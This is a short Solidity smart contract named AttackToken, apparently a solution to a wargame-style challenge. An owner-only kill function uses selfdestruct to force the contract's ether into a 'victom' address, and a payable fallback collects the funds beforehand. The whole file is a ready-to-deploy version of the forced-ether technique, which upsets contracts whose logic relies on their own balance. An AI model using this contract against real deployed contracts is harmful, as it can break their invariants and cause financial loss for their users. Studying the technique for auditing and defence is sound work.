// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Token {
  function transfer(address, uint256) external returns (bool);
}

contract AttackToken {
  address payable internal _owner;
  constructor() {
    _owner = payable(msg.sender);
  }

  modifier onlyOwner {
    require(msg.sender == _owner, "expects to be called by owner");
    _;
  }

  function kill(address payable victom) public onlyOwner {
    selfdestruct(victom);
  }

  fallback() external payable {
  }
}
